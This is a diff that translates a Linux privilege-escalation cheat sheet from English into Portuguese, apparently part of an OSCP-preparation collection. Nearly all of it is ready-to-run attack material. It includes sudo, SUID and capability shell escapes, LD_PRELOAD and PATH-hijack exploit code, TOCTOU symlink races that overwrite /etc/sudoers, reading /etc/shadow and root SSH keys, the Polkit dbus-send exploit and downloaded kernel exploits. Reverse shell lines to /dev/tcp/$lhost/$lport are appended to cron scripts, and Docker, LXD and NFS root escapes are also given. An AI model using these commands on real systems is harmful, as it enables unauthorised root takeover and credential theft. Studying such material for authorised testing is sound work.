@@ -1,82 +1,82 @@
-# Privilege Escalation Linux
+# Escalação de Privilégios Linux
 
-## Table of Contents
+## Índice
 
-- [Enumeration](#enumeration)
-- [SUDO Exploitation](#sudo-exploitation) ➜ [GTFOBins Guide](4.3.GTFOBins-Linux.md)
-- [SUID/SGID Exploitation](#suidsgid-exploitation)
-- [SUID PATH Hijacking](#suid-path-hijacking)
+- [Enumeração](#enumeração)
+- [Exploração de SUDO](#exploração-de-sudo) ➜ [Guia GTFOBins](GTFOBins-Linux.md)
+- [Exploração de SUID/SGID](#exploração-de-suidsgid)
+- [Sequestro de PATH via SUID](#sequestro-de-path-via-suid)
 - [Capabilities](#capabilities)
 - [Cron Jobs](#cron-jobs)
 - [Race Condition (TOCTOU)](#race-condition-toctou)
-- [Group Membership Abuse](#group-membership-abuse)
-- [Additional SUID Exploits](#additional-suid-exploits)
-- [Kernel Exploits](#kernel-exploits)
-- [Enumeration Tools](#enumeration-tools)
+- [Abuso de Membros de Grupo](#abuso-de-membros-de-grupo)
+- [Exploits SUID Adicionais](#exploits-suid-adicionais)
+- [Exploits de Kernel](#exploits-de-kernel)
+- [Ferramentas de Enumeração](#ferramentas-de-enumeração)
 - [NFS Root Squashing](#nfs-root-squashing)
-- [Docker Escape](#docker-escape)
-- [See Also](#see-also)
+- [Escape de Docker](#escape-de-docker)
+- [Veja Também](#veja-também)
 
 ---
 
-## Enumeration
+## Enumeração
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```shell
 id && sudo -l 2>/dev/null && find / -perm -4000 -type f 2>/dev/null && getcap -r / 2>/dev/null && cat /etc/crontab
 ```
 
-### Quick Enumeration (One-liner)
+### Enumeração Completa (One-liner)
 
 ```shell
-# Full system enum
+# Enumerar sistema completo
 uname -a && id && sudo -l 2>/dev/null && cat /etc/crontab 2>/dev/null
 
-# Find all SUID binaries
+# Encontrar todos os binários SUID
 find / -perm -4000 -type f 2>/dev/null | xargs ls -la
 
-# Find writable /etc files
+# Encontrar arquivos /etc graváveis
 find /etc -writable -type f 2>/dev/null
 
-# Search for passwords
+# Buscar senhas
 grep -rniE 'password|passwd|pwd|secret|credential' /etc /home /var/www 2>/dev/null | head -50
 ```
 
-### SUID Check (One-liner)
+### Verificação SUID (One-liner)
 
 ```shell
-# Find SUID + check GTFOBins
+# Encontrar SUID e verificar no GTFOBins
 for bin in $(find / -perm -4000 -type f 2>/dev/null); do echo "[*] $bin"; done
 ```
 
-### Capabilities Check (One-liner)
+### Verificação de Capabilities (One-liner)
 
 ```shell
-# Find files with capabilities
+# Encontrar arquivos com capabilities
 getcap -r / 2>/dev/null
 ```
 
-### Cron Jobs Check (One-liner)
+### Verificação de Cron Jobs (One-liner)
 
 ```shell
-# Check all cron locations
+# Verificar todos os locais de cron
 cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null; ls -la /etc/cron.*/ 2>/dev/null
 ```
 
 ---
 
-## SUDO Exploitation
+## Exploração de SUDO
 
-**📖 See full GTFOBins guide: [4.3.GTFOBins-Linux.md](4.3.GTFOBins-Linux.md)**
+**📖 Veja o guia completo GTFOBins: [GTFOBins-Linux.md](GTFOBins-Linux.md)**
 
 ```shell
-sudo -l    # List sudo permissions
+sudo -l    # Listar permissões sudo
 ```
 
-### Quick Escapes (Most Common)
+### Escapes Rápidos (Mais Comuns)
 
-| Binary | Command |
+| Binário | Comando |
 | --- | --- |
 | vim | `sudo vim -c ':!/bin/bash'` |
 | find | `sudo find / -exec /bin/bash \; -quit` |
@@ -84,9 +84,9 @@ sudo -l    # List sudo permissions
 | less | `sudo less /etc/passwd` → `!/bin/bash` |
 | awk | `sudo awk 'BEGIN {system("/bin/bash")}'` |
 
-### LD_PRELOAD Exploitation
+### Exploração de LD_PRELOAD
 
-> If env_keep+=LD_PRELOAD in sudo -l
+> Se `env_keep+=LD_PRELOAD` aparecer no `sudo -l`
 
 ```c
 #include <stdio.h>
@@ -103,59 +103,59 @@ void _init() {
 
 ```shell
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
-sudo LD_PRELOAD=/tmp/shell.so <ALLOWED_BINARY>
+sudo LD_PRELOAD=/tmp/shell.so <BINARIO_PERMITIDO>
 ```
 
 ---
 
-## SUID/SGID Exploitation
+## Exploração de SUID/SGID
 
 ```shell
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-> Check GTFOBins for SUID exploits: <https://gtfobins.github.io/>
+> Verificar GTFOBins para exploits SUID: <https://gtfobins.github.io/>
 
-### Common SUID Exploits
+### Exploits SUID Comuns
 
 ```shell
-# /usr/bin/find with SUID
+# /usr/bin/find com SUID
 ./find . -exec /bin/sh -p \; -quit
 
-# /usr/bin/python3 with SUID
+# /usr/bin/python3 com SUID
 ./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
-# /usr/bin/vim with SUID
+# /usr/bin/vim com SUID
 ./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 
-# /usr/bin/bash with SUID
+# /usr/bin/bash com SUID
 ./bash -p
 ```
 
 ---
 
-## SUID PATH Hijacking
+## Sequestro de PATH via SUID
 
-> When a SUID binary calls another binary without full path
+> Quando um binário SUID chama outro binário sem o caminho completo
 
-### Identify Vulnerable SUID
+### Identificar SUID Vulnerável
 
 ```shell
-# Find SUID binaries
+# Encontrar binários SUID
 find / -perm -4000 -type f 2>/dev/null
 
-# Check what commands the binary calls
-strings /path/to/suid_binary
-ltrace /path/to/suid_binary 2>&1
-strace /path/to/suid_binary 2>&1
+# Verificar quais comandos o binário chama
+strings /caminho/para/suid_binario
+ltrace /caminho/para/suid_binario 2>&1
+strace /caminho/para/suid_binario 2>&1
 
-# Look for calls like: system("command") instead of system("/usr/bin/command")
+# Procurar chamadas como: system("comando") em vez de system("/usr/bin/comando")
 ```
 
-#### Exploitation
+#### Exploração
 
 ```c
-// exploit.c - Create malicious binary for PATH hijacking
+// exploit.c - Criar binário malicioso para sequestro de PATH
 #include <stdlib.h>
 #include <unistd.h>
 
@@ -168,27 +168,27 @@ int main() {
 ```
 
 ```shell
-# Compile malicious binary
-gcc -o <hijacked_binary_name> exploit.c
-chmod +x <hijacked_binary_name>
+# Compilar binário malicioso
+gcc -o <nome_do_binario_sequestrado> exploit.c
+chmod +x <nome_do_binario_sequestrado>
 
-# Prepend current directory to PATH
+# Adicionar diretório atual ao início do PATH
 export PATH=$(pwd):$PATH
 
-# Run the vulnerable SUID binary
-/path/to/suid_binary
-# Get root shell!
+# Executar o binário SUID vulnerável
+/caminho/para/suid_binario
+# Obter shell root!
 ```
 
-#### Example: scp SUID Hijacking
+#### Exemplo: Sequestro de SUID scp
 
 ```shell
-# If /usr/bin/scp is SUID and calls 'ssh' without full path:
+# Se /usr/bin/scp tem SUID e chama 'ssh' sem caminho completo:
 gcc -o ssh exploit.c
 chmod +x ssh
 export PATH=$(pwd):$PATH
-scp file user@host:/path
-# Get root shell because scp calls our malicious 'ssh'
+scp arquivo user@host:/caminho
+# Obter shell root porque scp chama nosso 'ssh' malicioso
 ```
 
 ---
@@ -199,19 +199,19 @@ scp file user@host:/path
 getcap -r / 2>/dev/null
 ```
 
-### Exploit Examples
+### Exemplos de Exploração
 
 ```shell
-# cap_setuid+ep on python3
+# cap_setuid+ep em python3
 ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
-# cap_setuid+ep on perl
+# cap_setuid+ep em perl
 ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
 
-### Capabilities Reference Table
+### Tabela de Referência de Capabilities
 
-| Capability | Binary | Exploitation |
+| Capability | Binário | Exploração |
 |------------|--------|--------------|
 | `cap_setuid+ep` | python | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
 | `cap_setuid+ep` | perl | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` |
@@ -219,36 +219,36 @@ getcap -r / 2>/dev/null
 | `cap_setuid+ep` | php | `php -r 'posix_setuid(0); system("/bin/sh");'` |
 | `cap_setuid+ep` | node | `node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'` |
 | `cap_dac_read_search+ep` | tar | `tar cvf /tmp/shadow.tar /etc/shadow && tar xvf /tmp/shadow.tar` |
-| `cap_dac_override+ep` | vim | Read/write any file regardless of permissions |
-| `cap_net_raw+ep` | tcpdump | Packet capture without root |
-| `cap_net_bind_service+ep` | - | Bind to ports < 1024 |
+| `cap_dac_override+ep` | vim | Ler/escrever qualquer arquivo ignorando permissões |
+| `cap_net_raw+ep` | tcpdump | Captura de pacotes sem root |
+| `cap_net_bind_service+ep` | — | Bind em portas < 1024 |
 
-### Common Exploitable Binaries with cap_setuid
+### Binários Comuns Exploráveis com cap_setuid
 
 ```shell
-# GTFOBins-style exploitation
+# Exploração estilo GTFOBins
 /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
 /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
 
-# cap_dac_read_search - read protected files
+# cap_dac_read_search - ler arquivos protegidos
 /usr/bin/tar -cvf /tmp/passwd.tar /etc/shadow
 tar -xvf /tmp/passwd.tar
 
-# Openssl read protected files
+# Openssl para ler arquivos protegidos
 openssl enc -in /etc/shadow
 ```
 
-### Set Capabilities (as root for persistence)
+### Configurar Capabilities (como root para persistência)
 
 ```shell
-# Add capability
+# Adicionar capability
 sudo setcap cap_setuid+ep /usr/bin/python3
 
-# Remove capability  
+# Remover capability
 sudo setcap -r /usr/bin/python3
 
-# View all files with capabilities
+# Listar todos os arquivos com capabilities
 getcap -r / 2>/dev/null
 ```
 
@@ -263,21 +263,21 @@ ls -la /etc/cron.*
 crontab -l
 ```
 
-### Writable Cron Script
+### Script de Cron Gravável
 
 ```shell
-# If a cron job runs a writable script
-echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> /path/to/script.sh
+# Se um cron job executa um script gravável
+echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> /caminho/para/script.sh
 ```
 
-#### PATH Manipulation
+#### Manipulação de PATH
 
-> If cron runs script without absolute path
+> Se o cron executa script sem caminho absoluto
 
 ```shell
-echo "#!/bin/bash" > /tmp/scriptname
-echo "/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> /tmp/scriptname
-chmod +x /tmp/scriptname
+echo "#!/bin/bash" > /tmp/nomedoscript
+echo "/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> /tmp/nomedoscript
+chmod +x /tmp/nomedoscript
 export PATH=/tmp:$PATH
 ```
 
@@ -285,43 +285,43 @@ export PATH=/tmp:$PATH
 
 ## Race Condition (TOCTOU)
 
-> Time-of-Check to Time-of-Use vulnerability in SUID binaries
+> Vulnerabilidade Time-of-Check to Time-of-Use em binários SUID
 
-### Identify Vulnerable Binary
+### Identificar Binário Vulnerável
 
 ```shell
-# Look for patterns:
-# 1. Binary checks file permissions
-# 2. Time delay (sleep, network call, etc.)
-# 3. Binary reads/writes the file
+# Procurar padrões:
+# 1. Binário verifica permissões do arquivo
+# 2. Delay de tempo (sleep, chamada de rede, etc.)
+# 3. Binário lê/escreve o arquivo
 
-# Use ltrace to see syscalls
-ltrace ./vulnerable_suid_binary testfile 2>&1
-# Look for: access() followed by open() with delay between
+# Usar ltrace para ver syscalls
+ltrace ./binario_suid_vulneravel arquivoteste 2>&1
+# Procurar: access() seguido de open() com delay entre eles
 ```
 
-#### Basic Race Condition Exploit
+#### Exploit Básico de Race Condition
 
 ```shell
-# If binary checks access() then reads file:
-# We can switch the file between check and read
+# Se o binário verifica access() e depois lê o arquivo:
+# Podemos trocar o arquivo entre a verificação e a leitura
 
-# Create symlink switcher loop
+# Loop para trocar symlink
 while true; do
-    ln -sf /root/flag.txt testfile
-    ln -sf /tmp/dummy.txt testfile
+    ln -sf /root/flag.txt arquivoteste
+    ln -sf /tmp/dummy.txt arquivoteste
 done &
 
-# Race the SUID binary many times
+# Executar o binário SUID muitas vezes
 for i in $(seq 1 1000); do
-    ./vulnerable_suid_binary testfile 2>/dev/null
+    ./binario_suid_vulneravel arquivoteste 2>/dev/null
 done
 ```
 
-#### TOCTOU to Read Root Files
+#### TOCTOU para Leitura de Arquivos Root
 
 ```c
-// switch.c - Rapidly switch symlink target
+// switch.c - Trocar alvo do symlink rapidamente
 #include <stdio.h>
 #include <unistd.h>
 
@@ -337,151 +337,151 @@ int main(int argc, char *argv[]) {
 ```
 
 ```shell
-# Compile
+# Compilar
 gcc -o switch switch.c
 
-# Create dummy file that passes access check
+# Criar arquivo dummy que passa na verificação de acesso
 touch /tmp/dummy && chmod 644 /tmp/dummy
 
-# Run symlink switcher in background
-./switch testfile &
+# Executar trocador de symlink em background
+./switch arquivoteste &
 
-# Run vulnerable binary repeatedly
-for i in $(seq 1 1000); do ./vulnerable_suid_binary testfile; done 2>/dev/null | grep -v "denied"
+# Executar binário vulnerável repetidamente
+for i in $(seq 1 1000); do ./binario_suid_vulneravel arquivoteste; done 2>/dev/null | grep -v "denied"
 ```
 
-#### TOCTOU for Sudoers Modification
+#### TOCTOU para Modificação de Sudoers
 
 ```shell
-# If SUID binary writes to file we control:
-# Race to switch file to /etc/sudoers
+# Se o binário SUID escreve em arquivo que controlamos:
+# Corrida para trocar o arquivo por /etc/sudoers
 
-echo "user ALL=(ALL:ALL) NOPASSWD: ALL" > /tmp/payload
+echo "usuario ALL=(ALL:ALL) NOPASSWD: ALL" > /tmp/payload
 
-# Switcher script
+# Script trocador
 while true; do
-    ln -sf /tmp/payload testfile
-    ln -sf /etc/sudoers testfile
+    ln -sf /tmp/payload arquivoteste
+    ln -sf /etc/sudoers arquivoteste
 done &
 
-# Trigger the write
-./vulnerable_suid_writer testfile
+# Disparar a escrita
+./binario_suid_gravador arquivoteste
 
-# Check if it worked
+# Verificar se funcionou
 sudo -l
 ```
 
 ---
 
-## Group Membership Abuse
+## Abuso de Membros de Grupo
 
-### Disk Group
+### Grupo Disk
 
-> If user is in disk group, can read raw disk and access all files
+> Se o usuário está no grupo disk, pode ler o disco bruto e acessar todos os arquivos
 
 ```shell
-# Check group membership
+# Verificar membros do grupo
 id
 groups
 ```
 
-#### Using debugfs
+#### Usando debugfs
 
 ```shell
-# Find disk device (usually /dev/sda1 or /dev/sda2)
+# Encontrar dispositivo de disco (geralmente /dev/sda1 ou /dev/sda2)
 lsblk
 df -h
 
-# Read /etc/shadow directly from disk
+# Ler /etc/shadow diretamente do disco
 debugfs /dev/sda2
 debugfs: cat /etc/shadow
 
-# Read SSH keys
+# Ler chaves SSH
 debugfs: cat /root/.ssh/id_rsa
 
-# Exit debugfs
+# Sair do debugfs
 debugfs: quit
 ```
 
-#### Crack Root Password
+#### Quebrar Senha do Root
 
 ```shell
-# Copy shadow hash to file
-echo 'root:$6$...:...' > root_hash.txt
+# Copiar hash do shadow para arquivo
+echo 'root:$6$...:...' > hash_root.txt
 
-# Crack with john
-john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
+# Quebrar com john
+john --wordlist=/usr/share/wordlists/rockyou.txt hash_root.txt
 
-# Switch to root
+# Trocar para root
 su root
 ```
 
-### Docker Group
+### Grupo Docker
 
 ```shell
-# Mount host filesystem in privileged container
+# Montar sistema de arquivos do host em container privilegiado
 docker run -v /:/mnt --rm -it alpine chroot /mnt bash
 
-# Or spawn shell with root access
+# Ou abrir shell com acesso root
 docker run -v /:/mnt -it alpine /bin/sh
 cat /mnt/etc/shadow
 ```
 
-### LXD/LXC Group
+### Grupo LXD/LXC
 
 ```shell
-# Import Alpine image
+# Importar imagem Alpine
 lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage
 
-# Create privileged container
+# Criar container privilegiado
 lxc init myimage ignite -c security.privileged=true
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 lxc start ignite
 lxc exec ignite /bin/sh
 
-# Access host filesystem
+# Acessar sistema de arquivos do host
 cat /mnt/root/etc/shadow
 ```
 
 ---
 
-## Additional SUID Exploits
+## Exploits SUID Adicionais
 
-> Check GTFOBins: <https://gtfobins.github.io/>
+> Verificar GTFOBins: <https://gtfobins.github.io/>
 
-### strace SUID
+### strace com SUID
 
 ```shell
-# If /usr/bin/strace has SUID bit
+# Se /usr/bin/strace tem bit SUID
 strace -o /dev/null /bin/sh -p
 
-# -p flag preserves privileges
-whoami  # Should be root
+# -p preserva privilégios
+whoami  # Deve ser root
 ```
 
-### mawk SUID / sudo
+### mawk com SUID / sudo
 
 ```shell
-# If sudo mawk is allowed
+# Se sudo mawk for permitido
 sudo mawk 'BEGIN {system("/bin/sh")}'
 sudo /usr/bin/mawk 'BEGIN {system("/bin/bash")}'
 ```
 
 ### exiftool (CVE-2021-22204)
 
-> djvu file parsing vulnerability - limited versions
+> Vulnerabilidade no parsing de arquivo djvu — versões limitadas
 
 ```shell
-# Check version
+# Verificar versão
 exiftool -ver
 
-# Affected: 7.44 - 12.23
+# Afetado: 7.44 - 12.23
 searchsploit exiftool
 ```
 
 ---
 
-## Kernel Exploits
+## Exploits de Kernel
 
 ### Dirty COW (CVE-2016-5195)
 
@@ -489,7 +489,7 @@ searchsploit exiftool
 
 ```shell
 gcc -pthread dirty.c -o dirty -lcrypt
-./dirty <new_password>
+./dirty <nova_senha>
 su firefart
 ```
 
@@ -504,7 +504,7 @@ gcc exploit.c -o exploit
 
 ### PwnKit (CVE-2021-4034)
 
-> polkit pkexec LPE
+> LPE via polkit pkexec
 
 ```shell
 python3 cve-2021-4034.py
@@ -512,34 +512,34 @@ python3 cve-2021-4034.py
 
 ### Polkit (CVE-2021-3560)
 
-> polkit privilege escalation via timing attack (Ubuntu 20.04, RHEL 8, Fedora 21+)
+> Escalação de privilégios polkit via ataque de timing (Ubuntu 20.04, RHEL 8, Fedora 21+)
 
 ```shell
-# Check polkit version
+# Verificar versão do polkit
 pkaction --version
 
-# Exploit - create user with sudo privileges
-time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Attacker User" int32:1 & sleep 0.005s; kill $!
+# Exploit - criar usuário com privilégios sudo
+time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:atacante string:"Atacante" int32:1 & sleep 0.005s; kill $!
 
-# Set password
+# Definir senha
 time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$salt$hash' string:'' & sleep 0.005s; kill $!
 
-# Login as new user
-su - attacker
+# Logar como novo usuário
+su - atacante
 sudo -i
 ```
 
-> Automated exploit
+> Exploit automatizado
 
 ```shell
-# Download and run
+# Baixar e executar
 wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py
 python3 CVE-2021-3560.py
 ```
 
 ### Looney Tunables (CVE-2023-4911)
 
-> glibc LPE
+> LPE via glibc
 
 ```shell
 ./exp
@@ -550,36 +550,36 @@ python3 CVE-2021-3560.py
 > Linux Kernel 4.4.x - 4.13.x (Ubuntu 16.04)
 
 ```shell
-# Check kernel version
+# Verificar versão do kernel
 uname -r
 cat /etc/os-release
 
-# Download exploit
+# Baixar exploit
 wget https://raw.githubusercontent.com/rlarabee/exploits/master/cve-2017-16995/cve-2017-16995.c
 
-# Compile on target (or cross-compile)
+# Compilar no alvo (ou cross-compilar)
 gcc cve-2017-16995.c -o cve-2017-16995
 
-# Execute
+# Executar
 ./cve-2017-16995
-whoami  # Should be root
+whoami  # Deve ser root
 ```
 
-#### Alternative: Searchsploit
+#### Alternativa: Searchsploit
 
 ```shell
-# Find exploit
+# Encontrar exploit
 searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
-searchsploit -m 45010  # Copy exploit
+searchsploit -m 45010  # Copiar exploit
 
-# Compile and run
+# Compilar e executar
 gcc 45010.c -o exploit
 ./exploit
 ```
 
 ---
 
-## Enumeration Tools
+## Ferramentas de Enumeração
 
 ### LinPEAS
 
@@ -587,7 +587,7 @@ gcc 45010.c -o exploit
 
 ```shell
 ./linpeas.sh
-./linpeas.sh -a    # All checks
+./linpeas.sh -a    # Todas as verificações
 ```
 
 ### LinEnum
@@ -596,7 +596,7 @@ gcc 45010.c -o exploit
 
 ```shell
 ./LinEnum.sh
-./LinEnum.sh -t    # Thorough checks
+./LinEnum.sh -t    # Verificações detalhadas
 ```
 
 ### linux-exploit-suggester
@@ -611,11 +611,11 @@ gcc 45010.c -o exploit
 
 > <https://github.com/DominicBreuker/pspy>
 
-> Monitor processes without root
+> Monitorar processos sem root
 
 ```shell
 ./pspy64
-./pspy64 -pf -i 1000    # Print commands and file system events
+./pspy64 -pf -i 1000    # Exibir comandos e eventos do sistema de arquivos
 ```
 
 ---
@@ -623,35 +623,35 @@ gcc 45010.c -o exploit
 ## NFS Root Squashing
 
 ```shell
-# Check NFS exports
+# Verificar exportações NFS
 cat /etc/exports
 showmount -e $rhost
 ```
 
-### Exploit no_root_squash
+### Explorar no_root_squash
 
 ```shell
-# On attacker machine
+# Na máquina atacante
 mkdir /tmp/nfs
 mount -t nfs $rhost:/share /tmp/nfs
 cp /bin/bash /tmp/nfs/
 chmod +s /tmp/nfs/bash
 
-# On victim
+# Na vítima
 /share/bash -p
 ```
 
 ---
 
-## Docker Escape
+## Escape de Docker
 
 ```shell
-# Check if in container
+# Verificar se está em container
 cat /proc/1/cgroup
 ls /.dockerenv
 ```
 
-### Privileged Container Escape
+### Escape de Container Privilegiado
 
 ```shell
 mkdir /tmp/escape
@@ -668,21 +668,21 @@ sh -c "echo \$\$ > /tmp/escape/x/cgroup.procs"
 
 ---
 
-## See Also
+## Veja Também
 
-### Related Files
+### Arquivos Relacionados
 
-- **[Windows Privilege Escalation](4.1.Privilege-Escalation-Windows.md)** - Potato exploits, DLL hijacking, credential storage
-- **[CVE Exploits](../2.CVE-Exploit/2.1.CVE-Exploit.md)** - Dirty Cow, Dirty Pipe, Kernel exploits
+- **[Escalação de Privilégios Windows](Privilege-Escalation-Windows.md)** — Potato exploits, DLL hijacking, armazenamento de credenciais
+- **[Exploits CVE](../2.CVE-Exploit/2.1.CVE-Exploit.md)** — Dirty Cow, Dirty Pipe, exploits de kernel
 
-### Post-Exploitation
+### Pós-Exploração
 
-- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - SSH lateral movement
-- **[Ligolo-ng Guide](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** - Tunnel through Linux pivot
-- **[Reverse Shells](../6.OS-Command/6.3.Reverse-Shell.md)** - Shell payloads after escalation
+- **[Movimentação Lateral](../5.Lateral-Movement/5.1.Lateral-Movement.md)** — Movimentação lateral via SSH
+- **[Guia Ligolo-ng](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** — Tunnel via pivot Linux
+- **[Reverse Shells](../6.OS-Command/6.3.Reverse-Shell.md)** — Payloads de shell após escalação
 
-### OSCP Preparation
+### Preparação OSCP
 
-- **[Lab Walkthrough Examples](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - Linux privesc in action
-- **[Exam Tips & Tricks](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - Linux enumeration priority
-- **[OSCP Exam Guide - Linux PrivEsc](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md#phase-3-privilege-escalation---linux-15-นาที)** - Quick reference
+- **[Exemplos de Lab Walkthrough](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** — Privesc Linux em ação
+- **[Dicas e Truques do Exame](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** — Prioridade de enumeração Linux
+- **[Guia do Exame OSCP - Linux PrivEsc](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** — Referência rápida
